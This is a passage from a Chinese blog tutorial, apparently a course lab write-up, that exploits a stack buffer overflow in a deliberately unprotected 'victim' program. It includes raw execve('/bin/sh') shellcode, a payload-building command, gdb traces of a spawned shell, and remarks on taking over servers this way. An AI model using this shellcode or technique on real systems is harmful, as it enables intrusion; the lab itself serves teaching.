class="line">Starting program: /home/3130104006/project3/victim `cat evil.bin`</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">B+ │0x401170 &lt;foo+12&gt;       mov    -0x48(%rbp),%rdx                          │</span><br><span class="line">   │0x401174 &lt;foo+16&gt;       lea    -0x40(%rbp),%rax                          │</span><br><span class="line">   │0x401178 &lt;foo+20&gt;       mov    %rdx,%rsi                                 │</span><br><span class="line">   │0x40117b &lt;foo+23&gt;       mov    %rax,%rdi                                 │</span><br><span class="line">&gt;  │0x40117e &lt;foo+26&gt;       callq  0x400320                                  │</span><br><span class="line">  &gt;│0x401183 &lt;foo+31&gt;       leaveq <span class="comment"># 程序暂时停在这里                        │</span></span><br><span class="line">   │0x401184 &lt;foo+32&gt;       retq                                             │</span><br><span class="line">   │0x401185 &lt;main&gt;         push   %rbp                                      │</span><br><span class="line">   │0x401186 &lt;main+1&gt;       mov    %rsp,%rbp                                 │</span><br><span class="line">   │0x401189 &lt;main+4&gt;       sub    <span class="variable">$0x10</span>,%rsp                                │</span><br><span class="line">   │0x40118d &lt;main+8&gt;       mov    %edi,-0x4(%rbp)                           │</span><br><span class="line">   │0x401190 &lt;main+11&gt;      mov    %rsi,-0x10(%rbp)                          │</span><br><span class="line">   │0x401194 &lt;main+15&gt;      mov    -0x10(%rbp),%rax                          │</span><br><span class="line">   │0x401198 &lt;main+19&gt;      add    <span class="variable">$0x8</span>,%rax                                 │</span><br><span class="line">   └─────────────────────────────────────────────────────────────────────────┘</span><br><span class="line">child process 20231 In: foo                           Line: 7    PC: 0x401183</span><br><span class="line">(gdb) x/2gx <span class="variable">$rbp</span></span><br><span class="line">0x7fffffffe3c0: 0x9090909090909090      0x00007fffffffe3d0</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
<p>　　当程序执行完对<code>strcpy</code>的调用，停在<code>0x401183</code>处时，我们利用<code>x</code>命令查看栈数据，发现<code>%rbp + 8</code>存放的就是我们之前注入的返回地址<code>0x7fffffffe3d0</code>，这说明我们的注入步骤成功啦！于是，小明自信地敲下<code>c</code>键，满怀信心地期待着攻击的生效，结果让他一脸懵逼的一幕出现了：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 程序跑飞了～～</span></span><br><span class="line">   ┌─────────────────────────────────────────────────────────────────────────┐</span><br><span class="line">  &gt;│0x7fffffffe3d2  (bad)                                                    │</span><br><span class="line">   │0x7fffffffe3d3  (bad)                                                    │</span><br><span class="line">   │0x7fffffffe3d4  (bad)                                                    │</span><br><span class="line">   │0x7fffffffe3d5  jg     0x7fffffffe3d7                                    │</span><br><span class="line">&gt;  │0x7fffffffe3d7  add    %al,(%rax)                                        │</span><br><span class="line">   │0x7fffffffe3d9  add    %al,(%rax)                                        │</span><br><span class="line">   │0x7fffffffe3db  add    %al,(%rdx)                                        │</span><br><span class="line">   │0x7fffffffe3dd  add    %al,(%rax)                                        │</span><br><span class="line">   │0x7fffffffe3df  add    %al,(%rax)                                        │</span><br><span class="line">   │0x7fffffffe3e1  add    %al,(%rax)                                        │</span><br><span class="line">   │0x7fffffffe3e3  add    %al,(%rax)                                        │</span><br><span class="line">   │0x7fffffffe3e5  add    %al,(%rax)                                        │</span><br><span class="line">   │0x7fffffffe3e7  add    %al,0x40(%rbx,%rdx,1)                             │</span><br><span class="line">   │0x7fffffffe3eb  add    %al,(%rax)                                        │</span><br><span class="line">   └─────────────────────────────────────────────────────────────────────────┘</span><br><span class="line">child process 21114 In:                         Line: ??   PC: 0x7fffffffe3d2</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program received signal SIGILL, Illegal instruction.</span><br><span class="line">0x00007fffffffe3d2 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
<p>　　Illegal instruction？为啥会这样呢？我们不是已经做好一切工作了嘛！有了恶意代码，也知道了恶意代码的起始地址，甚至还成功将函数的返回地址修改成了恶意代码的起始地址，按理来说，程序返回后就应该去执行我们的恶意代码呀。<br>　　然而，这是幻觉。我们可以看一下<code>0x7fffffffe3d0</code>附近的指令，是不是很奇怪，这根本不是我们设计的恶意代码呀！这时错误原因很明显了，<code>0x7fffffffe3d0</code>原来不是恶意代码的起始位置！<br>　　这似乎有些矛盾。我们前面提到GDB有关闭<code>stack randomization</code>，那么程序的初始栈顶地址应该是不变的，从而buffer的地址也不应该变。但事实并不是这样，因为我们忽视了一个条件：<strong>不受其他外界因素的影响</strong>。这里出现的外界因素是什么呢？其实就是我们输入的数据自身，要知道我们把这些数据作为参数传给<code>main</code>函数时，它们是要被压入堆栈的，这会使得栈顶地址变得更小，从而buffer对应的地址也会更小，不再是原来的<code>0x7fffffffe3d0</code>了。我们需要重新获取正确的buffer地址，这次我们还是将<code>evil.bin</code>作为参数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取正确的buffer地址</span></span><br><span class="line">   ┌─────────────────────────────────────────────────────────────────────────┐</span><br><span class="line">B+ │0x401170 &lt;foo+12&gt;       mov    -0x48(%rbp),%rdx                          │</span><br><span class="line">   │0x401174 &lt;foo+16&gt;       lea    -0x40(%rbp),%rax                          │</span><br><span class="line">  &gt;│0x401178 &lt;foo+20&gt;       mov    %rdx,%rsi <span class="comment"># 程序暂时停在这里              │</span></span><br><span class="line">   │0x40117b &lt;foo+23&gt;       mov    %rax,%rdi                                 │</span><br><span class="line">   │0x40117e &lt;foo+26&gt;       callq  0x400320                                  │</span><br><span class="line">   │0x401183 &lt;foo+31&gt;       leaveq                                           │</span><br><span class="line">   │0x401184 &lt;foo+32&gt;       retq                                             │</span><br><span class="line">   │0x401185 &lt;main&gt;         push   %rbp                                      │</span><br><span class="line">   │0x401186 &lt;main+1&gt;       mov    %rsp,%rbp                                 │</span><br><span class="line">   └─────────────────────────────────────────────────────────────────────────┘</span><br><span class="line">child process 21854 In: foo                           Line: 6    PC: 0x401178</span><br><span class="line">(gdb) p/x <span class="variable">$rax</span></span><br><span class="line"><span class="variable">$1</span> = 0x7fffffffe380</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
<p>　　原来<code>0x7fffffffe380</code>才是真正的buffer地址，话不多说，赶紧修改<code>evil.bin</code>中的数据，将<code>\xd0\xe3\xff\xff\xff\x7f</code>换为<code>\x80\xe3\xff\xff\xff\x7f</code>，然后重新使用GDB观察攻击是否生效：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重新测试</span></span><br><span class="line">3130104006@hamsa:~/project3$ ruby -e <span class="string">'print "\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh"+"\x90"*22+"\x80\xe3\xff\xff\xff\x7f"'</span> &gt; evil.bin</span><br><span class="line">3130104006@hamsa:~/project3$</span><br><span class="line">3130104006@hamsa:~/project3$ gdb victim -q</span><br><span class="line">Reading symbols from /home/3130104006/project3/victim...done.</span><br><span class="line">(gdb) r `cat evil.bin`</span><br><span class="line">Starting program: /home/3130104006/project3/victim `cat evil.bin`</span><br><span class="line">warning: no loadable sections found <span class="keyword">in</span> added symbol-file system-supplied DSO at 0x7ffff7ffd000</span><br><span class="line">process 22411 is executing new program: /bin/dash</span><br><span class="line">$</span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$0</span></span><br><span class="line">/bin/sh</span><br><span class="line">$</span><br><span class="line">$ uptime</span><br><span class="line"> 10:33:04 up 5 days,  4:58, 13 users,  load average: 0.00, 0.01, 0.05</span><br><span class="line">$</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">[Inferior 1 (process 22411) exited normally]</span><br><span class="line">(gdb) q</span><br><span class="line">3130104006@hamsa:~/project3$</span><br></pre></td></tr></table></figure></p>
<p>　　哇！这次是真正的成功了。我们看到，在利用<code>evil.bin</code>内的数据作为程序参数时，程序会自动执行<code>/bin/sh</code>，我们也能在这个shell中执行一些常用的Linux命令。这就是一次非常简单的<code>buffer overflow</code>攻击呀！<br>　　可能有些同学看到这里，会觉得这个攻击好low啊，就跑了一个shell，又不是拿到了什么管理员密码啥的，并没有什么作用嘛。其实不然，跑出一个shell是一件很有意义的事！试想一下，假设某个网站有一个输入框，要求用户输入自己的账号，而聪明的你发现经过某些特别的手段(不一定是<code>buffer overflow</code>)，能够使网站后台程序接收到你的输入后跑出shell，此时你一定乐坏了。因为你能够通过输入命令查看到服务器的很多重要信息！注意，此时你的身份不一定是root，这取决于执行网站程序的用户身份，如果刚好是root在跑这个网站程序，那么恭喜你，你拥有了root的权限，这台服务器已经属于你了；如果不是，那也不要紧，起码这个服务器的一部分已经属于你。</p>
<h2 id="Exploit-Buffer-Overflow-without-GDB"><a href="#Exploit-Buffer-Overflow-without-GDB" class="headerlink" title="Exploit Buffer Overflow without GDB"></a>Exploit Buffer Overflow without GDB</h2><p>　　下面介绍一下，不用GDB怎么实现<code>buffer overflow</code>。<br>// TODO</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">~/Documents/Network_Penetration_and_Security/project3 ⌚ 20:39:26</span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$0</span></span><br><span class="line">zsh</span><br><span class="line"></span><br><span class="line">~/Documents/Network_Penetration_and_Security/project3 ⌚ 20:39:28</span><br><span class="line">$ gcc victim.c -g -Wall -fno-stack-protector -z execstack -static -o victim</span><br><span class="line"></span><br><span class="line">~/Documents/Network_Penetration_and_Security/project3 ⌚ 20:39:30</span><br><span class="line">$ ./victim `cat input.bin`</span><br><span class="line">$</span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$0</span></span><br><span class="line">/bin/sh</span><br><span class="line">$</span><br><span class="line">$ ls -l</span><br><span class="line">total 2588</span><br><span class="line">-rw-r--r-- 1 hac hac     79 May  9 20:32 input.bin</span><br><span class="line">-rw-r--r-- 1 hac hac     49 May  8 10:48 shellcode.bin</span><br><span class="line">-rwxr-xr-x 1 hac hac 874196 May  9 20:17 sp</span><br><span class="line">-rw-r--r-- 1 hac hac    428 May  9 20:16 sp.c</span><br><span class="line">-rwxr-xr-x 1 hac hac 874200 May  9 20:35 <span class="built_in">test</span></span><br><span class="line">-rw-r--r-- 1 hac hac    169 May  9 20:35 test.c</span><br><span class="line">-rwxr-xr-x 1 hac hac 874202 May  9 20:39 victim</span><br><span class="line">-rw-r--r-- 1 hac hac    169 May  9 20:37 victim.c</span><br><span class="line">$</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">~/Documents/Network_Penetration_and_Security/project3 ⌚ 20:39:49</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol>
<li><a href="http://phrack.org/issues/49/14.html" target="_blank" rel="noopener">Smashing The Stack For Fun And Profit</a>(非常详细的说明，也是MIT 6-858推荐的阅读材料)</li>
<li><a href="http://10.214.148.181/" target="_blank" rel="noopener">Lecture Homepage</a>(仅学校内网可以访问)</li>
</ol>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Security/" rel="tag"># Security</a>
          
            <a href="/tags/Assembly/" rel="tag"># Assembly</a>
          
            <a href="/tags/Buffer-Overflow/" rel="tag"># Buffer Overflow</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2016/05/03/Buffer-Overflow理论/" rel="next" title="Buffer Overflow理论">
                <i class="fa fa-chevron-left"></i> Buffer Overflow理论
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2016/06/01/使用John-the-Ripper破解密码/" rel="prev" title="使用John the Ripper破解密码">
                使用John the Ripper破解密码 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.png"
                alt="Xiao An" />
            
              <p class="site-author-name" itemprop="name">Xiao An</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">28</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">16</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/ihac" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://plus.google.com/u/0/117973548704440941150" target="_blank" title="Google">
                      
                        <i class="fa fa-fw fa-google"></i>Google</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://stackoverflow.com/users/7708919/hac" target="_blank" title="StackOverflow">
                      
                        <i class="fa fa-fw fa-stack-overflow"></i>StackOverflow</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://twitter.com/zjuhac" target="_blank" title="Twitter">
                      
                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:hac@zju.edu.cn" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Design-Shell-Code"><span class="nav-number">1.</span> <span class="nav-text">Design Shell Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-Buffer-Overflow-with-GDB"><span class="nav-number">2.</span> <span class="nav-text">Exploit Buffer Overflow with GDB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-Buffer-Overflow-without-GDB"><span class="nav-number">3.</span> <span class="nav-text">Exploit Buffer Overflow without GDB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Xiao An</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
  


  

  

</body>
</html>
